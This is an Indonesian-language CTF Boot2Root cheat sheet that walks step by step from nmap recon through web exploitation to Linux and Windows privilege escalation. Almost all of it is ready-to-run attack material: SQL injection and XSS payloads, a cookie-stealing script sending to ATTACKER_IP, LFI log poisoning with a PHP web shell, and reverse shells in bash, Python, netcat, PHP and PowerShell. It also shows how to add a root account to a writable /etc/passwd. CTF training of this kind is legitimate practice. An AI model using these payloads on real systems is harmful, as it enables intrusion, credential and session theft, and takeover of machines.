# 🔴 Template Offensive Red Team CTF — Modul B

> **Alur Boot2Root:** Recon → Scan → Enum → Exploit → PrivEsc → Root → Writeup

---

## ✅ CHECKLIST METODOLOGI

```
[ ] 1. Recon & Network Scanning
[ ] 2. Service Enumeration
[ ] 3. Web Exploitation
[ ] 4. Exploitation (Metasploit / Manual)
[ ] 5. Privilege Escalation
[ ] 6. Post-Exploitation
[ ] 7. Submit flag + Writeup
```

---

## 1. RECON & NETWORK SCANNING — NMAP

```bash
# ===== SCAN CEPAT (mulai di sini) =====
nmap -sV -sC -O --open -oN scan_awal.txt <TARGET_IP>

# ===== SCAN SEMUA PORT =====
nmap -p- --min-rate 5000 -oN all_ports.txt <TARGET_IP>

# ===== SCAN UDP (top ports) =====
nmap -sU --top-ports 20 -oN udp_scan.txt <TARGET_IP>

# ===== AGGRESSIVE SCAN =====
nmap -A -T4 -p- -oN aggressive.txt <TARGET_IP>

# ===== VULN SCAN =====
nmap --script vuln -p <PORTS> -oN vuln_scan.txt <TARGET_IP>

# ===== SCAN SUBNET =====
nmap -sn 192.168.1.0/24

# Variabel target — ganti sesuai soal:
TARGET_IP="10.10.10.X"
```

---

## 2. WEB ENUMERATION

### Directory/File Brute Force

```bash
# Gobuster (directory):
gobuster dir -u http://<TARGET_IP> \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,js,asp,aspx,bak \
    -t 50 \
    -o gobuster_hasil.txt

# Gobuster (subdomain):
gobuster dns -d <domain.com> \
    -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Feroxbuster (lebih cepat):
feroxbuster -u http://<TARGET_IP> \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt -t 100

# Nikto (vuln web scanner):
nikto -h http://<TARGET_IP> -o nikto.txt

# WhatWeb (teknologi web):
whatweb http://<TARGET_IP>
```

### Curl Tricks

```bash
# Cek header response:
curl -I http://<TARGET_IP>

# Follow redirect:
curl -L http://<TARGET_IP>

# POST request:
curl -X POST -d "username=admin&password=admin" http://<TARGET_IP>/login

# Upload file:
curl -F "file=@/path/to/shell.php" http://<TARGET_IP>/upload
```

---

## 3. WEB EXPLOITATION

### SQL Injection (SQLi)

```bash
# SQLmap — auto exploit:
sqlmap -u "http://<TARGET_IP>/page?id=1" --dbs --batch
sqlmap -u "http://<TARGET_IP>/page?id=1" -D <database> --tables --batch
sqlmap -u "http://<TARGET_IP>/page?id=1" -D <database> -T <table> --dump --batch

# SQLmap dengan cookie:
sqlmap -u "http://<TARGET_IP>/page" --cookie="PHPSESSID=xxx" --data="id=1" --dbs

# SQLmap via POST:
sqlmap -u "http://<TARGET_IP>/login" --data="user=admin&pass=test" --dbs

# Manual SQLi payload test:
# ' OR '1'='1
# ' OR 1=1--
# ' UNION SELECT NULL,NULL--
# admin'--
```

### XSS (Cross-Site Scripting)

```bash
# Basic XSS payload:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
';alert(1);//

# Steal cookie:
<script>document.location='http://<ATTACKER_IP>/steal?c='+document.cookie</script>
```

### LFI/RFI (File Inclusion)

```bash
# LFI basic:
http://<TARGET_IP>/page.php?file=../../../../etc/passwd
http://<TARGET_IP>/page.php?file=../../../../etc/shadow
http://<TARGET_IP>/page.php?file=../../../../etc/ssh/sshd_config

# LFI dengan filter bypass:
http://<TARGET_IP>/page.php?file=....//....//etc/passwd
http://<TARGET_IP>/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd

# Log poisoning via LFI (menanam shell di log):
# 1. Inject payload ke User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET_IP>/
# 2. Include log file:
http://<TARGET_IP>/page.php?file=../../../../var/log/apache2/access.log&cmd=id

# RFI:
http://<TARGET_IP>/page.php?file=http://<ATTACKER_IP>/shell.php
```

### Command Injection

```bash
# Basic payloads:
; id
| id
&& id
`id`
$(id)

# Reverse shell via command injection:
; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

### File Upload Bypass

```bash
# Rename extension:
shell.php → shell.php.jpg → shell.phtml → shell.php5 → shell.pHp

# Magic bytes bypass (tambahkan header gambar):
echo -e '\xFF\xD8\xFF<?php system($_GET["cmd"]); ?>' > shell.jpg.php

# MIME type bypass via Burp:
# Ubah Content-Type: image/jpeg tapi content tetap PHP

# .htaccess upload (jika allowed):
echo "AddType application/x-httpd-php .jpg" > .htaccess
# Lalu upload shell.jpg berisi PHP code
```

---

## 4. REVERSE SHELL — TEMPLATE SIAP PAKAI

```bash
# ===== LISTENER DI ATTACKER =====
nc -lvnp 4444
# atau:
rlwrap nc -lvnp 4444

# ===== PAYLOAD REVERSE SHELL =====

# Bash:
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'

# Python3:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (dengan -e):
nc -e /bin/bash <ATTACKER_IP> 4444

# Netcat (tanpa -e):
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 > /tmp/f

# PHP:
php -r '$sock=fsockopen("<ATTACKER_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Upgrade Shell ke TTY

```bash
# Setelah dapat shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Tekan Ctrl+Z
stty raw -echo; fg
# Tekan Enter dua kali
export TERM=xterm
stty rows 40 cols 170
```

---

## 5. PRIVILEGE ESCALATION — LINUX

```bash
# ===== OTOMATIS =====
# LinPEAS (paling lengkap):
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# atau transfer dulu:
python3 -m http.server 8080  # di attacker
wget http://<ATTACKER_IP>:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# LinEnum:
./LinEnum.sh -s -r report -e /tmp/ -t

# ===== MANUAL CEK =====

# SUID files:
find / -perm -u=s -type f 2>/dev/null

# SGID files:
find / -perm -g=s -type f 2>/dev/null

# Sudo rights:
sudo -l

# Cron jobs:
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Writable /etc/passwd:
ls -la /etc/passwd
# Jika writable, tambahkan user root baru:
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd

# PATH hijacking:
echo $PATH
# Cari script yang panggil command tanpa full path

# Capabilities:
getcap -r / 2>/dev/null

# Kernel exploit check:
uname -a
cat /proc/version
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# GTFO Bins — cek di: https://gtfobins.github.io/
```

---

## 6. PRIVILEGE ESCALATION — WINDOWS

```powershell
# ===== OTOMATIS =====
# WinPEAS:
.\winPEASx64.exe

# PowerUp:
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# ===== MANUAL CEK =====

# Cek privilege:
whoami /priv
whoami /groups

# Cek service yang vulnerable:
sc qc <service_name>
icacls "C:\path\to\service.exe"

# Cek scheduled tasks:
schtasks /query /fo LIST /v

# Cek AlwaysInstallElevated:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Cek unquoted service path:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Token impersonation (jika SeImpersonatePrivilege):
# Gunakan PrintSpoofer atau GodPotato
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

---

## 7. KRIPTOGRAFI — QUICK DECODE

```bash
# Base64:
echo "dGVzdA==" | base64 -d
echo "test" | base64

# ROT13:
echo "uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Hex:
echo "68656c6c6f" | xxd -r -p
echo -n "hello" | xxd

# URL decode:
python3 -c "import urllib.parse; print(urllib.parse.unquote('%68%65%6c%6c%6f'))"

# Caesar cipher (coba semua shift):
python3 -c "
text = 'CIPHER_TEXT_HERE'
for i in range(26):
    result = ''.join(chr((ord(c)-65+i)%26+65) if c.isalpha() else c for c in text.upper())
    print(f'ROT{i}: {result}')
"

# Hash identify:
hash-identifier <HASH>
# atau:
hashid <HASH>

# Hash crack dengan hashcat:
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt # NTLM
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt # sha512crypt

# Hash crack dengan john:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 8. BINARY EXPLOITATION — DASAR

```python
# Template buffer overflow sederhana:
from pwn import *

# Hubungkan ke target:
p = process('./binary')       # local
# p = remote('IP', PORT)      # remote

# Cari offset:
# 1. Generate pattern: cyclic(200)
# 2. Jalankan, lihat crash address
# 3. Cari offset: cyclic_find(0x61616161)

offset = 64  # ganti sesuai hasil cyclic_find

# Basic buffer overflow:
payload = b"A" * offset
payload += p32(0xDEADBEEF)  # address tujuan (little endian)

p.sendline(payload)
p.interactive()
```

```bash
# GDB pwndbg (debug binary):
gdb ./binary
# Di dalam GDB:
# pattern create 200
# run
# pattern offset $rsp   (atau $eip untuk 32-bit)
# info functions
# x/s 0xADDRESS        # lihat string di address
# checksec               # cek proteksi binary

# Cek proteksi binary:
checksec ./binary
# NX, PIE, RELRO, Stack Canary
```

---

> 💡 **Tips Lomba:**
> 
> - Selalu simpan output scan ke file (`-oN output.txt`) agar bisa direview
> - Untuk Boot2Root: setelah dapat root, cari file `flag.txt` di `/root/` dan `/home/*/`
> - Dokumentasikan SETIAP langkah dengan screenshot untuk writeup!